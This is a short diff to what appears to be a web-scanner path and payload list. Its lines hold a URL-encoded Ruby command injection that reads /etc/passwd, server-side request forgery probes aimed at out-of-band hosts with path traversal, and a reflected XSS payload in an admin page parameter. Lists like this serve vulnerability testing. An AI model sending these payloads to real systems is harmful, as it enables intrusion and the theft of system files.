@@ -2,3 +2,11 @@
 ?IO.popen(%27cat%20%2Fetc%2Fpasswd%27).read%0A%23
 /cors_proxy/https://oast.me/
 /perfsonar-graphs/cgi-bin/graphData.cgi?action=ma_data&url=http://{{interactsh-url}}/esmond/perfsonar/archive/../../../&src=8.8.8.8&dest=8.8.4.4
+/test_shadow
+/rails/active_storage/direct_uploads
+/path/to/vulnerable/endpoint
+/test
+/admin/stats.php?entity=global&breakdown=affiliates&statsBreakdown=day%27%20onclick=alert(document.domain)%20accesskey=X%20
+/perfsonar-graphs/cgi-bin/graphData.cgi?action=ma_data&url=http://oast.fun/esmond/perfsonar/archive/../../../&src=8.8.8.8&dest=8.8.4.4
+/ccm/system/panels/page/preview_as_user/preview?cID=
+/v2/auth/roles
